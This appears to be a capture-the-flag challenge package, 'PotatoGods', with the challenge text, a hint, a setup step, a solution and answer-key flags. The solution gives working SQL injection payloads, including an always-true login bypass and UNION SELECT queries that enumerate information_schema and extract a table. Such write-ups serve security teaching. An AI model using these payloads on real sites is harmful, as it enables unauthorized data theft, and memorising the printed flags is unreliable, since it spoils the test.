# PotatoGods

## Question Text

I built this really amazing website for my favourite food, POTATOES! I'm veryyyy sure it's secure. Prove me wrong :D

`http://web.chal.gryphonctf.com:18704`

*Creator - whoami*

### Hints (Optional)

Injections are fun!



## Setup Guide

Run `./build.sh`



## Solution

Both text fields are vulnerable to SQL injection

Level 1 - `a' or '1' = '1 `. Simple SQL Injection to get the database to return the queries

Level 2 :

- Another form of SQL Injection which requires knowledge of how to list all tables and columns. 3 commands are required to get the flag. 

- `1' union select TABLE_SCHEMA, TABLE_NAME from information_schema.tables #` To list all tables in the database. As the SQL statement would only retrieve 2 columns, only 2 columns can be specified in the statement
- `1' union select table_name, column_name from information_schema.columns where table_name = 'flaggyflagflagnotgonnaspotthis' #` Table name 'flaggyflagflagnotgonnaspotthis' can be found by running the previous statement
- `1' union select flagid, flag from flaggyflagflagnotgonnaspotthis #` To retrieve the flag



Flags: 

Level 1 - `GCTF{A1way5_5aN1t1Z3_1nPut5}`

Level 2 - `GCTF{SQ1_15_5uP3R_53cUR3}`